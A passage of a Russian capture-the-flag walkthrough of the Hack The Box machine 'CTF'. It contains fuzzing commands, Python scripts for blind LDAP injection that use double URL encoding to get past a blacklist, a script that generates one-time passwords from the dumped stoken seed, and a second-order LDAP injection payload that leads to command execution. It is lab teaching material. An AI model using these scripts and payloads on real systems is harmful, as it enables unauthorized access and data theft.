думывать, какими словами лучше описать свой ход мысли при ее прохож‐
дении, чтобы сохранялась интрига. В то же время эта виртуалка весьма слож‐
на (уровень Insane — 7,9 балла из 10), что делает ее особенно привлекатель‐
ной для взлома тестирования на проникновение.
  На пути к победному флагу нам предсто ит:
 • поиграть со stoken — программой для Linux, которая генери рует одно‐
   разовые пароли (токены RSA SecurID);
 • разобраться с разными типами инъ екций LDAP (Blind, Second Order);
 • написать несколько скриптов на Python для брута каталога LDAP;
 • злоупотребить функциями архиватора 7z, в час тности его опцией @listﬁles,
   для чте ния файлов с пра вами суперпользователя.


РАЗВЕДКА
Nmap
Новая машина — новое ска ниро вание портов. «Ни дня без Nmap!» — впол не
годится на девиз пентестера.
   Как обычно, разделим этот процесс на две части. Сперва вежливо
осмотримся на предложенной к захвату территории с помощью обычного
SYN‐сканирования без излишеств.



  root@kali:~# nmap ‐n ‐v ‐Pn ‐oA nmap/initial 10.10.10.122
  root@kali:~# cat nmap/initial.nmap
  # Nmap 7.70 scan initiated Sun Jul 28 15:02:31 2019 as: nmap ‐n ‐v ‐Pn ‐
  oA nmap/initial 10.10.10.122
  Nmap scan report for 10.10.10.122
  Host is up (0.077s latency).
  Not shown: 998 filtered ports
  PORT   STATE SERVICE
  22/tcp open  ssh
  80/tcp open  http


  Read data files from: /usr/bin/../share/nmap
  # Nmap done at Sun Jul 28 15:02:41 2019 ‐‐ 1 IP address (1 host up)
  scanned in 10.17 seconds


К слову, опция ‐n даст Nmap понять, что мы не хотим, чтобы он пытал ся
резолвить имя хоста в IP‐адрес (так как мы уже указываем хост через его IP,
а не через доменное имя), опция ‐v немного расширит получаемый от ска‐
нера фидбэк (степень детализации фидбэка можно наращивать, добавляя
флаги ‐v вплоть до ‐vvv), а опция ‐Pn убедит Nmap в том, что нет необ‐
ходимости  проверять  (с  помощью  ICMP‐запроса),  что  хост  «жив»,
перед началом самого сканирования, так как мы наверняка знаем, что
машина сейчас в онлайне.
   Также не забудь указать путь для сохранения отчетов сканирования
во всех форматах через ‐oA на  случай, если придется писать  отчет
об успешно про веденном тестирова нии на про никновение, ведь ты же
на стороне благородных вайтхетов, я надеюсь?
   Теперь можно чуть‐чуть пошуметь, запросив более подробную информа‐
цию о запущенных сервисах на открытых портах и подключив к работе скрип‐
товый движок NSE.



  root@kali:~# nmap ‐n ‐v ‐Pn ‐sV ‐sC ‐oA nmap/version 10.10.10.122 ‐
  p22,80
  root@kali:~# cat nmap/version.nmap
  # Nmap 7.70 scan initiated Sun Jul 28 15:34:37 2019 as: nmap ‐n ‐v ‐Pn ‐
  sV ‐sC ‐oA nmap/version ‐p22,80 10.10.10.122
  Nmap scan report for 10.10.10.122
  Host is up (0.073s latency).


  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
  | ssh‐hostkey:
  |   2048 fd:ad:f7:cb:dc:42:1e:43:7d:b3:d5:8b:ce:63:b9:0e (RSA)
  |   256 3d:ef:34:5c:e5:17:5e:06:d7:a4:c8:86:ca:e2:df:fb (ECDSA)
  |_  256 4c:46:e2:16:8a:14:f6:f0:aa:39:6c:97:46:db:b4:40 (ED25519)
  80/tcp open  http    Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k‐fips
  mod_fcgid/2.3.9 PHP/5.4.16)
  | http‐methods:
  |   Supported Methods: POST OPTIONS GET HEAD TRACE
  |_  Potentially risky methods: TRACE
  |_http‐server‐header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k‐fips mod‐
  _fcgid/2.3.9 PHP/5.4.16
  |_http‐title: CTF


  Read data files from: /usr/bin/../share/nmap
  Service detection performed. Please report any incorrect results at
  https://nmap.org/submit/ .
  # Nmap done at Sun Jul 28 15:34:46 2019 ‐‐ 1 IP address (1 host up)
  scanned in 9.27 seconds


Итак, что же нам доступно.
 1. Демон веб‐сервера Apache без зазрения совес ти «сливает» нам дис три‐
   бутив ОС — мы имеем дело с CentOS. При слове CentOS в голове сразу
   выстраивается ряд мыслей: это свободный дистрибутив Linux на основе
  Red Hat; платные версии прог раммных про дуктов документируются гораз‐
   до лучше, чем бесплатные; раз CentOS — это бесплатная версия RHEL,
   следовательно, зная версию платного дистра (которую мы найдем быс‐
   трее благодаря подробной документации), мы также будем знать и вер‐
  сию CentOS, с которой работаем в данный момент. С первой ссылки поис‐
   ковика по запросу httpd versions red hat видим, что httpd 2.4.6 встроена
   в RHEL 7. Вот и ответ: перед нами CentOS 7.
 2. Открыто всего два порта: 22‐й — SSH и 80‐й — веб‐сервер Apache. Оче‐
   видно, что начинать исследование будем с веба.





                 Узнаем версию ОС по баннеру Apache


ВЕБ — ПОРТ 80
В этой части уделим внимание тому, что происхо дит на веб‐сервере ата‐
куемой машины и чем мы здесь сможем раз жить ся.


Браузер
Перейдя по адресу http://10.10.10.122:80, ты увидишь объ явление сле‐
дующего характера.





                     Главная стра ница веб‐сервера

Вот мой вольный перевод это го текста.



     В рам ках жиз ненного цик ла раз работки нашей сис темы  (SDLC ) нам
      необходимо испробовать пред ложенную технологию аутентифика ции,
      основанную на програм мных токенах, с помощью пентеста.
        За логинься, чтобы провес ти свои тес ты.
        Данный сер вер защищен  от  некоторых видов  атак, нап ример
      от ата ки методом «гру бой силы». Поэтому если ты попыта ешься заб-
      рутфор сить  некоторые  из дос тупных сер висов, ты можешь быть
      забанен на пять минут.
        Если приложе ние тебя забанит, это будет полностью твоя вина,
      поэтому не переза пус кай машину, не пор тя тем самым жиз ни дру гих
      иссле дова телей, но проведи вре мя бана с пользой, раз мышляя о дру-
       гих век торах входа в сис тему.
        Список забаненных IP-адре сов можно найти [здесь]. У тебя может
      не получиться загрузить этот список, пока ты находишься в бане.

На http://10.10.10.122:80/login.php тебя как раз ожидает та форма
авторизации, которую нельзя бру тить, если верить объявлению с главной.





                 Форма авторизации login.php

В исходниках этой страницы есть интерес ный комментарий, который немного
проливает свет на детали используемой технологии аутентификации.





                 Фрагмент исходного кода login.php


<!‐‐ we'll change the schema in the next phase of the project (if
and only if we will pass the VA/PT) ‐‐>
<!‐‐ at the moment we have choosen an already existing attribute in
order to store the token string (81 digits) ‐‐>

Во‐первых, речь идет о каком‐то «атрибуте», который содержит токен (об
этом чуть позже). Во‐вторых, тот самый токен, как заверяет нас комментарий
в сорцах, представляет собой строку длиной 81 символ (циф ры). Вопросив
поисковик о том, какой бывает софт для генера ции одноразовых паролей
в Linux, я нашел stoken.


stoken
Итак, stoken генерирует одноразо вые пароли, совместимые с маркерами
RSA SecurID 128 бит (AES). Маркеры SecurID обычно используются для аутен‐
тификации конечных пользователей на защищенных сетевых ресурсах и VPN,
поскольку OTP обеспечивают большую устойчивость ко многим атакам, свя‐
занным со статическими паролями.
  Я поискал слово ctf в readme, и, когда оно нашлось, я понял, что точно
на верном пути.





                  Фрагмент README.md к stoken

Следующим шагом я решил найти упо минание о той строке из 81 цифры,
речь о которой идет в HTML‐коде стра ницы с авторизацией. Это упоминание
было найдено и на первой странице из результатов поиска по запросу sto‐
ken 81 digits. И страница эта оказалась ману алом к stoken.





                  Фрагмент man page для stoken

Здесь плюс ко всему прочему мы впер вые узнаем, что скрывается за аббре‐
виатурой CTF: Compressed Token Format, а не Capture The Flag, как я и обе‐
щал.

Веб‑форма авто ризации
Вернувшись к форме логина и попробовав авторизоваться как admin:0000, я
увидел такое сооб щение об ошибке.





                    Поль зователя не сущес твует

Следом я попробовал элементарную SQL‐инъекцию, использовав в качестве
имени пользователя строку ' or 1=1 ‐‐ ‐... и не получил вообще никакой
реакции от веб‐сайта. Это навело меня на мысль, что на бэкенде с высокой
долей вероятности сущес тву ет некий черный спи сок, содержащий опре‐
деленные символы, которые форма не желает видеть в принципе. Скорее
всего, это некий список управляющих символов, которые используются
в выражениях, возвращающих выборку из БД по поль зовательскому запросу.
  Следовательно, передо мной на тот момент стояло две основные задачи:
определить содержимое этого списка (чем бы он в итоге ни оказался)
и получить имя пользователя, числящегося в базе данных сайта. Начнем.


ПЕРЕБОР ВАРИАНТОВ
Да, я знаю, что нам запретили брутить, но ведь если очень хочется, то можно?
К тому же у меня не было никакого желания вручную перебирать все спе‐
циальные символы из блеклиста, за которым я охо тился. Если не наглеть
и использовать небольшие сло вари для перебора, то можно постараться
не попасться.
   Будем использовать мой любимый репозиторий, в котором есть словари
для брутфорса на любой вкус, — SecLists. Найдем сло вари, содержащие спе‐
циальные символы, передадим с помощью xargs результаты поис ка утилите
wc с флагом ‐c для подсчета символов в каждом най денном словаре (он ока‐
зался один) и взглянем на содержимое.





                       /SecLists/Fuzzing/special‐chars.txt

64 символа. Не критично, поэто му расчехляем веб‐фаззер wfuzz — будем
брутить.


             INFO

                         wfuzz —  написанный  на  Python  фреймворк,
                      который представляет собой фаззер веб‐при‐
                      ложений и позволяет находить ошибки, ана лизи‐
                       руя ответы веб‐сервера на тот или иной зап рос.


Проанализировав структуру веб‐формы, которую будем ломать (с помощью
Burp, к примеру), составим запрос для wfuzz.



  root@kali:~# wfuzz ‐w special‐chars.txt ‐‐hw 233 ‐d
  'inputUsername=FUZZ&inputOTP=0000' 10.10.10.122/login.php


 • Опция w задаст путь до сло варя, по которо му нужно пройти.
 • Опция hw (от hide words) скроет все ответы сервера, которые вер‐
   нули 233 слова. Почему именно 233? Именно столько слов появляется
   на веб‐странице, которая возвра щается пользовате лю в слу чае, когда он
   получает сообщение об ошибке User <USER> not found (см. скриншот
   ранее): 229 слов изначально плюс 4 сло ва сооб щения об ошибке. Такие
   ответы нас не интересуют, потому что мы ловим только случаи, когда эта
   строка в ответе не появляет ся, то есть когда что‐то из содержимого поля
  юзернейма находится в блеклисте.
 • Опция d определяет вид зап роса, уходящий к серверу. На место заг‐
   лушки FUZZ wfuzz подставляет сло во из выб ранно го словаря (пос трочно).
  Мы фаззим поле inputUsername, отвечающее за имя пользователя, а до
  inputOTP нам пока дела нет, поэто му я пос тавил пер вое, что пришло
   в голову, — 0000.





             Фаззим поле юзерней ма спецсимволами

В графе Payload мы получили список всех специальных символов, на которые
форма авторизации отреагирова ла странно, а именно не так, как если бы
пользователей с такими именами не было в базе данных: сервер прос то про‐
игнорировал запросы с этими символами в поле Username.
  Интересно, что на символы & и + вооб ще третья реакция: форма пропус‐
кает эти символы, но почему‐то не считает их за слова (а количес тво сим‐
волов отличается). Что ж, не видя настро енного фильтра, нельзя быть уве рен‐
ным, что именно здесь происхо дит. Будем считать, что это не баг, а фича,
да и «в машине всегда были призраки, случай ные сегменты кода, которые,
скомпоновавшись вмес те, образуют непредвиденные протоколы...».
  После этого я еще немного поиграл с веб‐формой на самом сайте и доиг‐
рался до следующего: если передавать «запрещенные» символы, допол‐
нительно их закодировав, то хост отвечает ошиб кой, как и при нормальном
запросе, не содержащем спецсимво лов в имени пользователя.
  Объясню на примере: при попыт ке залогинить ся с кре дами *:0000
веб‐форма просто перезагружалась и игнорировала запрос (срабатывает
блеклист), а при попытке залогиниться с кредами %2a:0000 веб‐фор ма вдруг
вернула сообщение об ошиб ке вхо да. Заметь, даже не о том, что такого поль‐
зователя не существует, а просто что логин не удался.





                     Ошибка логина

Здесь‐то все вмиг и про яснилось.
 1. Форма однозначно уяз вима к какому‐то типу инъекции, так как изменилось
   поведение сайта, когда я сумел «протащить» символ * в поле, предназна‐
   ченное для имени поль зователя. К какому именно типу, нам предстоит
   выяснить далее, но, судя по символам в блеклисте и комментарию
   в исходном коде стра ницы, уже сейчас можно сделать предположение.
 2. Обойти блеклист нам поз волит не что иное, как Double URL Encoding.



                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
  НЕПРАВИЛЬНЫЙ CTF
           ОДНОРАЗОВЫЕ ПАРОЛИ, БУЙСТВО LDAP‐
            ИНЪЕКЦИЙ И ТРЮКИ C АРХИВАТОРОМ 7Z





Double URL Encoding
Когда ты отправ ляешь данные через веб‐формы, с вероятностью 99,9% они
предварительно оборачиваются в URL‐кодирование (еще его называют Per‐
cent‐encoding). Если без подробнос тей, то для спецсимволов, о которых мы
говорили ранее, процесс очень прост: в начале идет управля ющий символ
(процент), а за ним следует ASCII‐код кодируемого символа. К примеру, звез‐
дочка (*) будет закодирована как %2a, так как ее HEX‐код — 2A в таблице
ASCII.





                Символ астериск в таб лице ASCII

Самое инте ресное, что когда я отправляю * в юзернейме через эту форму, то
он URL‐кодируется сервером по умолчанию. Если же отправлять уже закоди‐
рованную вручную версию звездочки (%2a), она будет закодирована формой
повторно, то есть получится %252a, потому что сам символ % име ет ASCII‐код
25 в шестнадцатерич ном виде.
   Где‐то после проверки на вхождение в черный спи сок сервер дважды
успешно декодирует нашу звез дочку, и мы получаем нужный ответ. Механизм
фильтрации запрещенных символов ока зался  уязвим  к двойному URL‐
кодированию.
   Теперь посмотрим, что еще пропустит блеклист в таком виде. Утилита
wfuzz умеет кодировать полезную нагрузку, если задать флаг ‐z. В ее арсе‐
нале есть разные кодировщики, список всех дос тупных можно просмотреть
командой wfuzz ‐e encoders.
   Чтобы использовать wfuzz с двойным URL‐кодированием каждого символа
из файла, можно было бы попробовать следующую команду.



  root@kali:~# wfuzz ‐z file,special‐chars.txt,uri_double_hex ‐‐hw 233 ‐d
  'inputUsername=FUZZ&inputOTP=0000' 10.10.10.122/login.php


Однако не ко всем символам кодировщик был применен корректно (может,
в следующих сбор ках будет фикс), поэтому я решил вос пользоваться более
прямолинейным методом — словарем doble‐uri‐hex.txt из того же набора
SecLists. Красным я добавил пояс нение к полез ной нагрузке: сначала идет
символ в обычном URL‐кодиро вании, затем его представление в человечес‐
ком виде.





   Фаззим поле юзернейма спецсимво лами в двой ном URL‐кодировании

В итоге видим, что форма странно реагирует на четыре печатаемых символа
плюс нулевой байт: ), (, *, /. И здесь я уже почти уверился, что имею дело
с LDAP‐инъекцией.


LDAP-инъ екция
LDAP —  легковесный протокол  прикладного  уровня, предназначенный
для доступа к службе катало гов. Под «службой катало гов» может подразуме‐
ваться как X.500 (как задумывалось изна чально), так и любая другая иерар‐
хическая система управления базами данных (СУБД). Буква D в аббре виатуре
означает Directory — так сло жилось исто рически. Если ты мало знаком с этим
протоколом, то можешь смело заменять в уме Directory на Data: смысл
не изменится, но поводов запутать ся ста нет на один меньше.


        WWW

                     Хорошее чтиво про LDAP



LDAP‐инъекции не сильно отличают ся от тех же SQLi — методологии эксплу‐
атации в чем‐то схожи. Первым делом было бы неплохо определить пример‐
ную структуру уязвимого запроса, в поведение которого ты собираешься
бестактно вмешаться. Для этих целей можно вос пользоваться символом зак‐
рывающей скобки ) и нулевым байтом %00, благо оба символа есть в нашем
арсенале.
   Чтобы понять, что конкретно будет происходить, необ ходимо иметь пред‐
ставление об общем виде запроса. Выглядеть он может, к примеру, сле‐
дующим образом.


(&
    (key1=value1)
    (key2=value2)
    (key3=value3)
)

Амперсанд здесь, оче видно, выполняет роль логического И, свя зывающего
три утверждения в скобках. Так вот, допус тим, что значение первого ключа
(value1) подконтроль но пользователю при вводе. Тогда если вместо value1
мы отправим две закрывающие скобки и нулевой байт, который «срежет»
оставшуюся часть запроса (ана лог символа комментария ‐‐ для SQLi), то мы
сможем определить, уязвим ли этот LDAP‐запрос перед вмешательством.
  В нашем случае если сервер спо кой но съест измененный запрос и вернет
ошибку, указывающую на то, что такого пользователя не существует, значит,
ты сорвал джекпот и нашел валидное поле для инъекции, если ответом будет
тишина — значит, неудача.
   Чтобы облегчить себе жизнь и не мучиться с двойным кодированием
в Burp, я составил небольшой скрипт на Python, который дважды оборачивает
запрос  в  URL‐кодировку,  по  необ ходимос ти  добавляет  нулевой  байт
и посылает серверу POST‐запрос со всем этим безобразием в поле User‐
name. Значение для поля OTP статично и случайно — сейчас оно не играет
роли.


#!/usr/bin/env python3
# ‐*‐ coding: utf‐8 ‐*‐


# Использование: python3 inject.py <ИНЪЕКЦИЯ> <НУЛЕВОЙ_БАЙТ>


import sys
import re
from urllib.parse import quote_plus


import requests


# Куда стучимся
URL = 'http://10.10.10.122/login.php'


# Инъекция, закодированная в URL Encoding один раз (из первого
аргумента скрипта)
inject = quote_plus(sys.argv[1])


# Нулевой байт, подаваемый по необходимости (из второго аргумента
скрипта)
null_byte = sys.argv[2]


# Данные для POST‐запроса (библиотека requests закодирует значения
повторно => получится Double URL Encoding)
data = {
    'inputUsername': inject + null_byte,
    'inputOTP': '31337'
}


# Отправляем запрос
resp = requests.post(URL, data=data)


# Регулярками вытаскиваем ответ сервера
match = re.search(r'<div class="col‐sm‐10">(.*?)</div>', resp.text,
re.DOTALL)


# И выводим его на экран
print(match.group(1).strip())

Теперь нам предстоит определить количес тво скобок, необходимое для того,
чтобы изме ненный LDAP‐запрос оказал ся «пра виль ным». Начнем с одной
и будем в конце добавлять нулевой символ для отбрасывания оставшейся
части оригинального зап роса. Потом попробуем две, затем — три.





                Угадываем количество закрывающих скобок

На трех скобках сервер сооб щил, что не знает такого пользователя, поэтому
делаем вывод, что на самом деле структура ори гинального запроса имеет
примерно такой вид.


(&
    (&
        (key1=value1)
        (key2=value2)
        (key3=value3)
    )
    (&
        (key4=value4)
        ...
    )
    ...
)

Отлично! Мы выяснили, что форма /login.php уяз вима к LDAP‐инъ екции,
и сделали предположение о структуре LDAP‐запроса. Используем это, чтобы
выкрасть авторизационные данные!


Дампим юзернейм
Чтобы вытащить из базы имя пользователя, будем пользоваться символом *,
который успешно обрабатывается сервером. Сделаем предположе ние, что
юзернейм начинается, нап ример, с  буквы  a,  тогда поведение формы
при обработке запроса вида a* позволит определить, вер но ли наше пред‐
положение. Так как мы можем судить о корректнос ти наших суждений только
по возвращаемым сообщениям об ошиб ках, то налицо классичес кая инъ‐
екция «вслепую», или Blind LDAP Injection.
  Модифицировав немного свой скрипт, я прохожу по всем буквам латин‐
ского алфавита, отправляю серверу зап росы вида <БУКВА>* и смотрю
на ответ: если ошибка выг лядит как User <БУКВА>* not found, значит, поль‐
зователя, имя которого начина ется с буквы <БУКВА>, не существует, а если
в ответ приходит Cannot login, значит, имя мы угадали (но, естественно,
ошиблись в поле OTP, что сейчас не важно).


#!/usr/bin/env python3
# ‐*‐ coding: utf‐8 ‐*‐


# Использование: python3 inject.py


import re
from string import ascii_lowercase
from urllib.parse import quote_plus


import requests


URL = 'http://10.10.10.122/login.php'


for c in ascii_lowercase:
    inject = c + quote_plus('*')


    data = {
        'inputUsername': inject,
        'inputOTP': '31337'
    }


    resp = requests.post(URL, data=data)
    match = re.search(r'<div class="col‐sm‐10">(.*?)</div>', resp.
text, re.DOTALL)
    print(f'{c}* => {match.group(1).strip() == "Cannot login"}')





              Дампим имя поль зователя (проба пера)

Отловив ошибки второго типа, я могу сдампить имя пользователя целиком.
Для этого я снова немного изменю скрипт, чтобы не запус кать его 100500 раз
для каждой следующей вер ной буквы.


#!/usr/bin/env python3
# ‐*‐ coding: utf‐8 ‐*‐


# Использование: python3 inject.py


import re
import time
from string import ascii_lowercase
from urllib.parse import quote_plus


import requests


URL = 'http://10.10.10.122/login.php'


username, done = '', False
print()


while not done:
    for c in ascii_lowercase:
        inject = username + c + quote_plus('*')


        data = {
            'inputUsername': inject,
            'inputOTP': '31337'
        }


        resp = requests.post(URL, data=data)


        match = re.search(r'<div class="col‐sm‐10">(.*?)</div>', resp
.text, re.DOTALL)
        if match.group(1).strip() == 'Cannot login':
            username += c
            break


        print(f'[*] Username: {username}{c}', end='\r')  # sys.
stdout.write(f'\r{username}{c}')
        time.sleep(0.2)


    else:
        done = True


print(f'[+] Username: {username} \n')





                Дампим имя пользователя LDAP

Есть имя пользователя! Это ldapuser — кто бы мог подумать... Таким же спо‐
собом предлагаю сбрутить и дру гие атрибуты LDAP.


Дампим остальные атрибуты
Теперь пришло время ска зать пару слов о том, что собой представляет «ат‐
рибут» в терминоло гии LDAP. Если придерживать ся строгих определений, то
атрибут — это неч то, что содержит в себе объектный класс LDAP. Пос ледний
служит кирпичиком, из которых строятся записи базы данных. Другими сло‐
вами, атрибутом можно наз вать те самые ключи в парах «ключ — значение»
(key1=value1, ...) из примера выше.
  Мы уже видели подсказ ку в коммента рии исходника HTML‐страницы
/login.php о некоем «существующем атрибуте», который содержит строку
с токеном из 81 цифры. Что ж, нас тало время выяснить, какие атрибуты
существуют в име ющемся у нас каталоге LDAP. Для этого я буду использовать
wfuzz с пейлоадом такого вида.



  root@kali:~# wfuzz ‐w attributes.lst ‐‐hw 233 ‐d 'inputUsername=lda‐
  puser%2529%2528FUZZ%253d%252a%2529%2529%2529%2500&inputOTP=0000'
  10.10.10.122/login.php


Разберем подробнее. Во‐первых, откуда был взят словарь attributes.lst?
Я составил его из списка наиболее часто используемых атрибутов LDAP, пом‐
ня о том, что в подсказке было уточнение отно сительно уже существу ющего
атрибута. Значит, они не придумывали ничего сво его.





         Список наиболее часто используемых атрибутов LDAP

Пейлоад  ldapuser%2529%2528FUZZ%253d%252a%2529%2529%2529%2500 —
это не что иное, как ldapuser)(FUZZ=*)))%2500, где FUZZ — это очередной
атрибут из составлен ного мной списка. То есть я беру, к при меру, атрибут
mail и проверяю, что он будет содержать ответ на запрос с пейлоадом lda‐
puser)(mail=*)))%2500. Если атрибут существу ет, то я получу сообщение
об ошибке Cannot login, так как остальная часть LDAP‐запроса корректна.
Если атрибута не существует — не получу в ответ ничего, так как запрос поп‐
росту окажется неправильным.





                      Ат рибуты в базе данных LDAP

Итак, шесть атрибутов из нашего словаря есть в каталоге. Где было бы логич‐
нее всего хранить 81 цифру для токена CTF? Скорее всего, это будет зна‐
чение атрибута pager, ведь на дворе 2019 год и пей джерами вряд ли кто‐то
еще пользуется. Ну да ладно, все равно мы ради интереса сбру тим все при‐
сутствующие атрибуты.
  Я переименовал скрипт в brute.py, еще раз подправил его и сдампил все
атрибуты по списку.


#!/usr/bin/env python3
# ‐*‐ coding: utf‐8 ‐*‐


# Использование: python3 brute.py


import re
import time
from datetime import timedelta
from string import ascii_lowercase, digits
from urllib.parse import quote_plus


import requests


URL = 'http://10.10.10.122/login.php'


ATTRIBUTES = [
    'mail',
    'cn',
    'uid',
    'userPassword',
    'sn',
    'pager'
]


timestart = time.time()
print()


for a in ATTRIBUTES:
    attr, done = '', False


    while not done:
        if a == 'pager':
            charset = digits
        else:
            charset = ascii_lowercase + digits + '_‐@.'


        for c in charset:
            # Инъекция вида "ldapuser)(<ATTRIBUTE>=*)))%00"
            inject = f'ldapuser{quote_plus(")(")}{a}{quote_plus(
"=")}{attr}{c}{quote_plus("*)))")}'


            data = {
                'inputUsername': inject + '%00',
                'inputOTP': '31337'
            }


            resp = requests.post(URL, data=data)


            match = re.search(r'<div class="col‐sm‐10">(.*?)</div>',
resp.text, re.DOTALL)
            if match.group(1).strip() == 'Cannot login':
                attr += c
                break


            print(f'[*] {a}: {attr}{c}', end='\r')
            time.sleep(1)


        else:
            done = True


    print(f'[+] {a}: {attr} ')


print(f'\n[*] Затрачено: {timedelta(seconds=time.time() ‐ timestart)}
')

Не забывая пре достережение о воз можном бане, заботливо оставленное
на главной странице сервиса, я добавил задержку на одну секунду после
отправки оче редного зап роса,  чтобы минимизировать риски нарваться
на тайм‐аут. В итоге скрипту понадо билось 20 минут на перебор шести зна‐
чений атрибутов (с учетом того, что userPassword оказал ся пустым).





                Дампим остальные атрибуты LDAP

Кстати, имя пользователя, которое мы брутили в предыдущем параграфе, —
это так же, как все другие данные в мире LDAP, всего лишь значение очеред‐
ного атрибута — uid. А вот в зна чении атрибута pager скрывалось как раз то,
за чем мы охотились, — инициализатор (seed) генератора одноразовых
паролей stoken.


ОДНОРАЗОВЫЕ ПАРОЛИ (OTP)
Установим stoken, чтобы было чем, собственно, генерировать OTP.





                          Ус тановка stoken

Заглянув в мануал, смотрим, как лучше всего его юзать в нашем случае.



  root@kali:~# stoken ‐‐
  token=285449490011357156531651545652335570713167411445727140604172141456
  711102716717000 ‐‐pin=0000


В параметре ‐‐token я передаю найденный ранее сид, а с помощью ‐‐pin
задаю дефолтный PIN, чтобы софтина не спра шивала у меня его в интерак‐
тивном режиме. PIN — это локальная защита stoken, которая пре пятствует
получению OTP кем попало, кто про ходил мимо компьюте ра, но, так как у
меня PIN не установлен, я передаю его значение по умолчанию 0000.
  Далее сле дует учесть еще один важ ный момент: из‐за того что все алго‐
ритмы генерации одноразовых паролей опирают ся на время, установленное
на хосте, как на механизм синхрониза ции сро ка валидности OTP, тебе нужно
будет  узнать,  что  показывают  часы  на сервере. Сделать  это можно
с помощью curl.



  root@kali:~# curl ‐sv ‐‐stderr ‐ 10.10.10.122 | grep Date


Так как инстансы вир туалок на Hack The Box не име ют выхода в Сеть, они
не могут использовать про токол сетевого времени для синхронизации часов,
поэтому для тебя время может отличаться от того, что показывает сейчас
сервер CTF. Нужно сказать, что раз ница часовых поясов здесь роли не игра‐
ет, потому что stoken использует POSIX‐время (или Unix time) для генерации
нового OTP.



               Разница во времени между мной и ВМ CTF

Есть два варианта решения этой проб лемы: первый — отключить синхрониза‐
цию времени у себя на машине, вто рой — вос пользоваться опцией stoken ‐‐
use‐time, чтобы задать смещение часов между твоей ОС и сервером, где ты
собрался аутентифицировать ся.
   Так как я использую Kali в VirtualBox, то я боюсь лишний раз вмешиваться
в систему синхронизации времени пос ле того, как однажды ее нас троил.
К слову, в VMware это делается проще, там есть отдельная галочка для нас‐
тройки времени в конфиге самой ВМ, а вот в VBox черт ногу сломит, если ты
решил пользоваться внеш ними серверами NTP, а не офлайн‐синхрониза‐
цией с хостовой ОС.
  Поэтому я выбрал второй вариант и решил написать небольшой скрипт,
чтобы вычислять oﬀset авто матически и передавать его stoken. Чтобы убить
двух зайцев, я также добавлю немного жизни в свой скрипт и буду обновлять
одноразовый пароль каждую секунду и выводить его в терминал в бесконеч‐
ном цикле.


#!/usr/bin/env python3
# ‐*‐ coding: utf‐8 ‐*‐


# Использование: python3 otp.py


import time
from datetime import datetime
from subprocess import check_output


import requests


URL = 'http://10.10.10.122'


while True:
    kali = datetime.utcnow()
    server = datetime.strptime(requests.head(URL).headers['Date'], '%
a, %d %b %Y %X %Z')
    offset = int((server ‐ kali).total_seconds())


    cmd = [
        'stoken',
        '‐‐token=285449490011357156531651545652335570713167411445727
140604172141456711102716717000',
        '‐‐pin=0000',
        f'‐‐use‐time={"%+d" % offset}'
    ]


    print(check_output(cmd).decode().strip(), end='\r')
    time.sleep(1)




                       Генерируем OTP на лету

Теперь в нашем распоряжении всегда находится свежий одноразовый
пароль для доступа к защищенному содержимому веб‐ресурса. Посмотрим
же наконец, что скрывается за формой /login.php.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
  НЕПРАВИЛЬНЫЙ CTF
           ОДНОРАЗОВЫЕ ПАРОЛИ, БУЙСТВО LDAP‐
            ИНЪЕКЦИЙ И ТРЮКИ C АРХИВАТОРОМ 7Z





LDAP-инъ екция вто рого поряд ка
Авторизуемся в веб‐приложении как ldapuser с помощью OTP, который выдал
скрипт выше. Нас перебрасывает на стра ницу http://10.10.10.122/page.
php, где мы видим интерфейс для выполнения команд на удаленном сервере.





                      RCE на ВМ CTF

Пробуем выполнить любую команду (я ввел ls ‐la в поле Cmd) и видим сле‐
дующее.





        «Пользователь дол жен быть членом группы root или adm...»



      Пользователь должен быть чле ном груп пы  root или adm и иметь
      валид ный токен, чтобы выполнять команды на этом сер вере.

Столько стараний, чтобы в итоге увидеть ЭТО?! Ну уж нет, давай разбираться.
  Предположим, что механизм проверки, входит ли пользователь в упомяну‐
тые группы или нет, следующий: посылается еще один LDAP‐запрос, выпол‐
няемый на /page.php, который берет логин, введенный нами ранее при авто‐
ризации на /login.php, и подставляет его в LDAP‐структуру такого вида (в
эпилоге, к слову, мы проверим все наши предположения относительно вида
запросов LDAP).


(&
    (&
        (uid=$USERNAME)
        ...
    )
    (|
        (group=root)
        (group=adm)
    )
    ...
)

Здесь USERNAME — это то имя пользователя, которое мы вводили на
/login.php. Такая логика имеет право на существование, потому что я
не видел ни одного места, где явно передавал ся бы юзернейм при отправке
запроса на выполнение команды на /page.php.
  Следовательно, на момент, когда пользователь авторизован, юзернейм
уже известен серверу. Исходя из таких рас суждений, можно сделать вывод,
что перед нами LDAP‐инъ екция второго порядка (по аналогии с Second Order
SQLi), когда вредоносный запрос не исполня ется непосредственно сейчас,
но сохраняется в памяти сервера и будет исполнен при иных обстоятельствах
в дальнейшем.
   Тогда, чтобы обой ти проверку на вхождение имени пользователя в группы
root и adm, нужно всего лишь отсечь «хвост» запроса, который ее выполняет.
Сделать это можно с помощью уже зна комого тебе нулевого бай та %00: если
переменная USERNAME будет содержать пей лоад вида ldapuser)))%00, то
нежелательное усло вие (|(group=root)(group=adm)) «отвалится» и больше
не будет препятствовать выполнению команд.
  Победа:     перелогинившись     с     кредами     ldapuser)))%00
или ldapuser%29%29%29%00 под URL‐кодировкой, я могу успешно триггерить
удаленное выполнение команд.





                Результат выполнения ls ‐la на ВМ CTF


Reverse Shell
От RCE до шелла рукой подать, поэтому, не откладывая в долгий ящик,
получим сессию. Хар дкорная версия:  написать  скрипт, который  будет
общаться с этой веб‐формой и парсить резуль тат выполнения команд
из HTML‐кода. Этот вариант я покажу в эпилоге, а пока более читерский спо‐
соб.
  Я  буду  исполь зовать  стандартный  реверс‐шелл  PayloadsAllTheThings
на Bash. Он работает по TCP через 443‐й порт SSL, потому что на нем редко
блокируется исходящий трафик.





            Проб расываем reverse shell через форму RCE

По характерному зависанию странички видим,  что команда выполнена
успешно, и я получаю сессию.





                 Ловим отклик у себя на машине

К сожалению, у меня не получилось апгрейдить шелл до полноценного PTY,
как я демонстрировал это в про хождении Mischief. Не уверен до конца, что
послужило тому причиной, полагаю, таковы нас тройки системы: видимо,
ограничено максимально возможное количес тво используемых девайсов PTY
(из соображений безопас ности в том чис ле).





                Попытка апгрейдить шелл до PTY

